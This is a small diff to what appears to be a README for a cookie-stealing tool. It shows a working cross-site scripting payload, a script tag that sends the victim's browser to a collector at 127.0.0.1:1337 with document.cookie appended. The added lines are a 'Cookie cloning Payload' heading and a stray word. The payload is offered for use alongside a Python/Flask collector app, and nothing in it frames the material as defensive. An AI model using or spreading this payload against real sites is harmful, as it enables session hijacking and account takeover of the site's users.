@@ -4,3 +4,5 @@ This is the payload that can be used with the [cookie stealer Python/Flask app](
 ```
 <script type="text/javascript">document.location="http://127.0.0.1:1337/?c="+document.cookie;</script>
 ```
+# Cookie cloning Payload 
+kalinet
